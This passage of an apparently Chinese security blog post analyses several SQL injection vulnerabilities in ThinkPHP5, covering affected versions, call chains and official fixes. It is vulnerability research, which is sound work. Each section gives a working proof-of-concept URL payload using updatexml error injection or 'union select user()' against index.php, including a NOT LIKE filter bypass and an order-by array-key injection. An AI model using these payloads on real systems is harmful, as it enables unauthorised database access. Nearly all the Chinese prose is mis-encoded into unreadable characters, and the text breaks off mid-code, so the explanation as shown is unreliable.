</p><blockquote><p>ç°åœ¨å°±æ˜¯æƒ³åŠæ³•å¦‚ä½•é—­åˆï¼Œç„¶åè¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure><p>å³è®©<code>$fun</code> ä¸ºæˆ‘ä»¬çš„æ¶æ„Payload å³å¯ã€‚ç„¶åé—­åˆæ‰åé¢çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-1"><a href="#åˆ©ç”¨æ€»ç»“-1" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p><p>ä¸‹å›¾æ¥è‡ªå‚è€ƒèµ„æ–™ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§æœ€æ–°ç‰ˆï¼Œ</p><p>å®˜æ–¹ç›´æ¥åˆ äº†<code>parseArrayDate</code> å‡½æ•°ã€‚</p><blockquote><p>ä¸€ç‚¹ç‚¹æ„Ÿæƒ³ï¼Œæˆ‘æ„Ÿè§‰æŒ‰ç…§è¿™ä¸ªå¸ˆå‚…çš„åˆ†ææ€è·¯ï¼Œæ˜¯é€†ç€payload å»åˆ†æçš„æ¼æ´åŸå› ï¼Œæˆ‘å¥½æƒ³æ­£é¢ç›´æ¥æŒ–å•Šï¼Œèœæ­»äº†ã€‚</p></blockquote><h1 id="SQLæ³¨å…¥ä¸‰-select"><a href="#SQLæ³¨å…¥ä¸‰-select" class="headerlink" title="SQLæ³¨å…¥ä¸‰(select)"></a>SQLæ³¨å…¥ä¸‰(select)</h1><p>æ–°å¢å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12732557.html">https://www.cnblogs.com/wangtanzhi/p/12732557.html</a></p><blockquote><p>å­¦ä¹ å°±æ˜¯è¦å­¦ä¹ ä¸åŒå¤§ä½¬çš„æ€è·¯ï¼Œç„¶åè½¬æ¢ä¸ºè‡ªå·±çš„æ€è·¯ã€‚</p></blockquote><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105138.png" alt="image-20200914214213065"></p><p>sqlmap ä¹Ÿå¯ä»¥è·‘å‡ºç»“æœã€‚</p><h2 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>ThinkPHP5 å…¨ç‰ˆæœ¬</p><h2 id="æ¼æ´æ¦‚è¿°-2"><a href="#æ¼æ´æ¦‚è¿°-2" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseWhereItem</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><ul><li>MySQL ç›‘æ§</li></ul><blockquote><p>ç›‘æ§ä¸åˆ°ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚é…ç½®ä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚</p></blockquote><p><code>/application/index/controller/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105308.png" alt="image-20200914220015121"></p><blockquote><p>ç„¶åç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·è¿›å…¥æ¡†æ¶çš„ SQL æŸ¥è¯¢æ–¹æ³•ä¸­ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ Query ç±»çš„ where æ–¹æ³•ï¼Œé€šè¿‡å…¶ parseWhereExp æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ select æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º select è¯­å¥ã€‚ï¼ˆè¿™ä¸ªç‚¹å¾—è®°ä½ï¼Œæ¡†æ¶çš„sqlæŸ¥è¯¢æ–¹æ³•å…ˆè¿›å…¥ Query ç±»ï¼‰</p></blockquote><hr><blockquote><p>ç¨‹åºé»˜è®¤è°ƒç”¨ <strong>Request</strong> ç±»çš„ <strong>get</strong> æ–¹æ³•ä¸­ä¼šè°ƒç”¨è¯¥ç±»çš„ <strong>input</strong> æ–¹æ³•ï¼Œä½†æ˜¯è¯¥æ–¹æ³•é»˜è®¤æƒ…å†µä¸‹å¹¶æ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·è¿›å…¥æ¡†æ¶çš„ <strong>SQL</strong> æŸ¥è¯¢æ–¹æ³•ä¸­ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ <strong>Query</strong> ç±»çš„ <strong>where</strong> æ–¹æ³•ï¼Œé€šè¿‡å…¶ <strong>parseWhereExp</strong> æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ <strong>select</strong> æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º <strong>select</strong> è¯­å¥ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105416.png" alt="image-20200914222945520"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105701.png" alt="image-20200914224146213"></p><p>æ­¤å¤„è°ƒç”¨<code>$this-&gt;builder</code>çš„<code>select</code>æ–¹æ³•ã€‚è€Œæ­¤å¤„<code>$this-&gt;builder</code> ä¸º<code>think/db/builder/Mysql</code> ç±»ï¼Œç»§æ‰¿äº<code>Builder</code> ç±»ã€‚å› æ­¤è°ƒç”¨çš„æ˜¯<code>Builder</code>ç±»çš„<code>select</code> æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105718.png" alt="image-20200914225616763"></p><p>åœ¨ <strong>select</strong> æ–¹æ³•ä¸­ï¼Œç¨‹åºä¼šå¯¹ <strong>SQL</strong> è¯­å¥æ¨¡æ¿ç”¨å˜é‡å¡«å……ï¼Œå…¶ä¸­ç”¨æ¥å¡«å…… <strong>%WHERE%</strong> çš„å˜é‡ä¸­å­˜åœ¨ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚è·Ÿè¿›è¿™ä¸ª <strong>where</strong> åˆ†æå‡½æ•°ï¼Œä¼šå‘ç°å…¶ä¼šè°ƒç”¨ç”ŸæˆæŸ¥è¯¢æ¡ä»¶ <strong>SQL</strong> è¯­å¥çš„ <strong>buildWhere</strong> å‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105734.png" alt="image-20200914231827114"></p><p>æ­¤å¤„<code>$where</code> ç»è¿‡ <code>buildWhere</code> æ–¹æ³•å¤„ç†åè¿”å›<code>$whereStr</code></p><p><code>parseWhereItem</code> çš„ <code>where</code>  å­å•å…ƒå‡½æ•°æ–¹æ³•è°ƒç”¨ï¼Œå½“æ“ä½œç¬¦ä¸º<code>EXP</code> æ—¶ï¼Œç»è¿‡æ‹¼æ¥å¸¦å…¥SQLæŸ¥è¯¢ï¼Œé€ æˆSQLæ³¨å…¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105750.png" alt="image-20200914235436560"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105805.png" alt="image-20200915000616883"></p><p>å®Œæ•´çš„æ–¹æ³•è°ƒç”¨å¦‚ä¸Šå›¾ç»¿è‰²éƒ¨åˆ†ã€‚</p><h2 id="åˆ©ç”¨æ€»ç»“-2"><a href="#åˆ©ç”¨æ€»ç»“-2" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105825.png" alt="carbon (1)"></p><h2 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜ç½‘æœªä¿®å¤ã€‚</p><blockquote><p>ç»§æ‰¿ç±»ï¼Œç­‰é¢å‘å¯¹è±¡çš„åŸºæœ¬çŸ¥è¯†å¾ˆé‡è¦ã€‚</p></blockquote><h1 id="SQLæ³¨å…¥å››-select"><a href="#SQLæ³¨å…¥å››-select" class="headerlink" title="SQLæ³¨å…¥å››(select)"></a>SQLæ³¨å…¥å››(select)</h1><p>æ¼æ´å¤ç°ç¯å¢ƒå’Œä¸Šé¢åº”è¯¥æ˜¯å·®ä¸å¤šçš„ã€‚</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index.php&#x2F;index&#x2F;index?username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915125740.png" alt="image-20200915122649716"></p><h2 id="å½±å“ç‰ˆæœ¬-3"><a href="#å½±å“ç‰ˆæœ¬-3" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>ThinkPHP: 5.0.10</strong></p><h2 id="æ¼æ´æ¦‚è¿°-3"><a href="#æ¼æ´æ¦‚è¿°-3" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseWhereItem</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ã€‚å†ä¸€ä¸ªï¼Œ <strong>Request</strong> ç±»çš„ <strong>filterValue</strong> æ–¹æ³•æ¼è¿‡æ»¤ <strong>NOT LIKE</strong> å…³é”®å­—ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿ</p></blockquote><p>åœ¨MySQL ä¸­ <code>NOT LIKE</code>  ä¸ºæ¨¡ç³ŠæŸ¥è¯¢ï¼Œä»€ä¹ˆæ˜¯æ¨¡ç³ŠæŸ¥è¯¢å‘¢ï¼Ÿ</p><blockquote><p>mysqlæ¨¡ç³ŠæŸ¥è¯¢likeçš„ç”¨æ³•:</p><p>æŸ¥è¯¢userè¡¨ä¸­å§“åä¸­æœ‰â€œç‹â€å­—çš„ï¼š</p><p>select * from user where name like â€˜%ç‹%â€™</p><p>mysqlæ¨¡ç³ŠæŸ¥è¯¢not likeçš„ç”¨æ³•</p><p>æŸ¥è¯¢userè¡¨ä¸­å§“åä¸­æ²¡æœ‰â€œç‹â€å­—çš„ï¼š</p><p>select * from user where name not like â€˜%ç‹%â€™</p></blockquote><h2 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¯¥SQLæ³¨å…¥æ¼æ´å½±å“ç‰ˆæœ¬ä¸º <code>5.0.10</code> ï¼Œå› æ­¤å» <code>5.0.11</code> çš„æ›´æ–°è®°å½•ä¸­ï¼Œåˆ™å¯ä»¥æŸ¥çœ‹ç›¸å…³çš„ä¿®å¤æ“ä½œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190936.png" alt="image-20200915132004061"></p><p>Commit ï¼š<a href="https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d">https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d</a></p><p>ï¼ˆ æ€¥éœ€å¦‚ä½•å¿«é€Ÿå®šä½åˆ° æŸä¸ªæŒ‡å®šçš„commit è®°å½•çš„æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png" alt="image-20200915133611309"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä¹‹å‰æ˜¯æ²¡æœ‰å°†ç‰¹æ®Šå­—ç¬¦ <code>NOT LIKE</code>   ç»™è¿‡æ»¤æ‰ã€‚</p><hr><p>æ ¹æ®Payloadæ¥åˆ†ææ¼æ´åŸç†ï¼š</p><blockquote><p>ä¸ç®¡ä»¥å“ªç§æ–¹å¼ä¼ é€’æ•°æ®ç»™æœåŠ¡å™¨ï¼Œè¿™äº›æ•°æ®åœ¨ <strong>ThinkPHP</strong> ä¸­éƒ½ä¼šç»è¿‡ <strong>Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•</p></blockquote><p>åœ¨<code>input</code> æ–¹æ³•ä¸­ï¼šä¼ å…¥çš„æ•°æ®ä¼šç»è¿‡ filterValueè¿‡æ»¤<code>å’Œ </code>å¼ºåˆ¶ç±»å‹è½¬æ¢,ç„¶åè¿”å›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190852.png"></p><p>è·Ÿè¿›è¯¥æ–¹æ³•ï¼ŒæŸ¥çœ‹æ˜¯å¦‚ä½•å®ç°çš„ã€‚å‘ç°åˆä¼šè°ƒç”¨åˆ°<code>filterExp</code>  æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190840.png" alt="image-20200915142723291"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰è¿‡æ»¤<code>NOT LIKE</code></p><blockquote><p>ThinkPHPå¤„ç† <strong>SQL</strong> è¯­å¥çš„æ–¹æ³•ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ <strong>Query</strong> ç±»çš„ <strong>where</strong> æ–¹æ³•ï¼Œé€šè¿‡å…¶ <strong>parseWhereExp</strong> æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ <strong>select</strong> æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º <strong>select</strong> è¯­å¥ã€‚</p></blockquote><p>![image-20200915144157181](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915144157181.png)</p><p>æ­¤å¤„çš„<code>$this-&gt;builder</code> ä¸º <code>think\db\builder\Mysql</code> ç±»ã€‚è€Œ<code>Mysql</code> ç±»ç»§æ‰¿äº <code>Builder</code>ç±»ï¼Œæ‰€ä»¥ä¼šç»§ç»­è°ƒç”¨åˆ°<code>Builder</code>ç±»çš„<code>select</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è°ƒç”¨äº†<code>parseWhere</code>æ–¹æ³•ï¼Œç„¶åè°ƒç”¨äº†<code>buildWhere</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† <code>parseWhereItem</code> æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><p>æ­¤å¤„åˆ° æ“ä½œç¬¦ <code>$exp</code> ä¸º <code>NOT LIKE</code> æˆ– <code>LIKE</code> æ—¶ï¼ŒMySQL çš„é€»è¾‘æ§åˆ¶ç¬¦å¯æ§ã€‚åè¿›è¡Œæ‹¼æ¥è¿”å›å¸¦å…¥SQLè¯­å¥ä¸­æ‰§è¡Œï¼Œå¯¼è‡´äº†SQLæ³¨å…¥æ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185938.png" alt="image-20200915151528489"></p><p>æœ€ç»ˆçš„ç»“æœå°±æ˜¯è¿”å›å¸¦æœ‰æ¶æ„çš„SQL Payloadï¼ˆ<code>whereStr</code>ï¼Œçº¢è‰²éƒ¨åˆ†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190030.png" alt="image-20200915184916179"></p><p>æ•´ä¸ªè¿‡ç¨‹çš„æ–¹æ³•è°ƒç”¨æƒ…å†µå¦‚ç»¿è‰²æ¡†èµ·çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#96;username&#96; NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# &#96;username&#96; NOT LIKE &#39;233&#39;)</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-3"><a href="#åˆ©ç”¨æ€»ç»“-3" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><blockquote><p>ä¸‹å›¾æ¥è‡ªä¸ƒæœˆç«å¸ˆå‚…çš„æ€»ç»“æ–‡ç« é‡Œçš„ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915191318.png" alt="9"></p><h2 id="æ¼æ´ä¿®å¤-3"><a href="#æ¼æ´ä¿®å¤-3" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å¢åŠ è¿‡æ»¤</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png"></p><h1 id="SQLæ³¨å…¥äº”-order-by"><a href="#SQLæ³¨å…¥äº”-order-by" class="headerlink" title="SQLæ³¨å…¥äº”(order by)"></a>SQLæ³¨å…¥äº”(order by)</h1><p>ç¯å¢ƒæ­å»ºä¹Ÿå·®ä¸å¤šï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯<code>../config/app.php</code> ä¸‹çš„<code>app_debug</code> å’Œ <code>app_trace</code></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916002455.png" alt="image-20200915195454500"></p><h2 id="å½±å“ç‰ˆæœ¬-4"><a href="#å½±å“ç‰ˆæœ¬-4" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong></p><h2 id="æ¼æ´æ¦‚è¿°-4"><a href="#æ¼æ´æ¦‚è¿°-4" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <code>Builder</code> ç±»çš„ <code>parseOrder</code> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› SQL è¯­å¥ï¼Œæœ€ç»ˆå¯¼è‡´ SQLæ³¨å…¥æ¼æ´ çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-4"><a href="#æ¼æ´åˆ†æ-4" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232420.png" alt="image-20200915201246990"></p><p>![image-20200915202933679](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915202933679.png)</p><p>ä»ä¿®æ”¹è®°å½•ä¸­çœ‹åˆ°ï¼Œå¢åŠ äº†ä¸€æ¡ifåˆ¤æ–­è¯­å¥æ¥è¿‡æ»¤<code>$key</code>ä¸­çš„<code>)</code> å’Œ <code>#</code>  ã€‚è¿™ä¸¤ä¸ªç¬¦å·ä¹Ÿæ˜¯åœ¨CTFä¸­å¾€å¾€ä¼šè¿‡æ»¤çš„ç‚¹ã€‚</p><p>æˆ‘ä»¬çš„æ•°æ®éƒ½ä¼šè¿›å…¥åˆ°<code>Request</code> ç±»ä¸­çš„<code>input</code>æ–¹æ³•ï¼Œå¹¶ä¸”ç»è¿‡<code>filterValue</code>æ–¹æ³•çš„è¿‡æ»¤å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢å¹¶è¿”å›<code>$data</code>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232744.png"></p><p>è¿™é‡Œ<code>array_walk_recursive()</code>å‡½æ•°ï¼Œå¯¹æ•°ç»„ä¸­çš„æˆå‘˜é€’å½’è°ƒç”¨<code>filterValue</code> è¿‡æ»¤å‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232803.png" alt="image-20200915205211882"></p><p>ä½†æ˜¯<code>filterValue</code> è¿‡æ»¤å‡½æ•°ï¼Œä¸è¿‡æ»¤æ•°ç»„çš„<code>key</code> ï¼Œ åªè¿‡æ»¤äº†æ•°ç»„çš„<code>value</code> ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>è¿›å…¥æ¡†æ¶çš„ SQLæŸ¥è¯¢æ–¹æ³•ä¸­ï¼Œè¿›å…¥<code>Query</code>ç±»ï¼Œè¿™æ¬¡æ˜¯é€šè¿‡è°ƒç”¨<code>order</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232853.png" alt="image-20200915210341486"></p><p>æ¶æ„Payload æœªç»è¿‡ä»»ä½•è¿‡æ»¤ç›´æ¥ä¼ é€’ç»™<code>options[&#39;order&#39;]</code> ä¸­ã€‚æ¥ç€è°ƒç”¨<code>find()</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232946.png" alt="image-20200915210940031"></p><p>æ­¤å¤„<code>$this-&gt;connection</code> æ˜¯<code>think/db/connectior/Mysql</code>ç±» ï¼Œç»§æ‰¿äº<code>Connection</code>ç±»ï¼Œäºæ˜¯æ­¤å¤„ç»§ç»­è°ƒç”¨è¯¥ç±»çš„<code>find()</code>æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233014.png" alt="image-20200915211715450"></p><p>è¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† <code>$this-&gt;builder</code>, å³<code>think/db/builder/Mysql</code> ç±»çš„<code>select</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•é€šè¿‡<code>str_replace</code> å‡½æ•°ï¼Œå°†æ•°æ®å¡«å……åˆ°SQLè¯­å¥ä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨äº†<code>parseOrder</code> æ–¹æ³•ï¼Œè·Ÿè¿›ä¸‹ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 